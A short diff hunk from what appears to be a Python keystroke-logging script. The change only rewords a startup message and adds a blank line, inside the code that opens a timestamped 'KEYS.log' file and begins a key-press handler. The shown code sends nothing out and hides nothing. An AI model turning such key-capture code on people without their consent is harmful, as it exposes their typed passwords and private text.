@@ -8,7 +8,8 @@ current_time = datetime.now().strftime("%Y%m%d-%H%M%S")
 log_name = log_dir+current_time + " KEYS.log"
 
 logging.basicConfig(filename=(log_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-print("Logging has started")
+print("Logging started")
+
 def on_press(key):
     global is_logging
     if is_logging:
